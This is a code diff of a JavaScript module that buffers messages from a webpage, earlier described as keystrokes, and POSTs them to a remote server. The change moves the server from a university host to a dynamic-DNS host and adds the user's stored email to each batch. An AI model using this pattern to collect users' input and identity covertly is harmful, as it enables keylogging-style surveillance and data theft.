@@ -1,15 +1,21 @@
 // A dumb package that will relay messages from webpage to remote storage
 (function() {
 
-  var DATA_URL = 'http://yuze.stanford.edu:8081';
+  var DATA_URL = 'http://yuze.no-ip.org:8081';
   var MAX_TEMP = 5;
   var isSending = false;
 
   var tempStorage = [];
  
-  var sendDataToServer = function() {
+  function sendDataToServer() {
     isSending = true;
-    var dataString = JSON.stringify(tempStorage);
+    var data = {
+      email: localStorage['email'],
+      payload: tempStorage
+    };
+    console.log(JSON.stringify(data, null, 2));
+    var dataString = JSON.stringify(data);
+
     $.post(DATA_URL, dataString);
     console.log(dataString);
     tempStorage = [];
@@ -17,12 +23,11 @@
   };
 
   // Receives data, sends it off to a server for storage.
-  var receiveData = function(msg) {
+  function receiveData(msg) {
     if (isSending) {
-      setTimeout(function(){receiveData(msg);}, 500);
+      setTimeout(function(){ receiveData(msg); }, 500);
     } else {
-      var keystrokes = msg.keystrokes;
-      tempStorage.push.apply(tempStorage, keystrokes);
+      tempStorage.push(msg);
       if (tempStorage.length > MAX_TEMP) {
         sendDataToServer();
       }
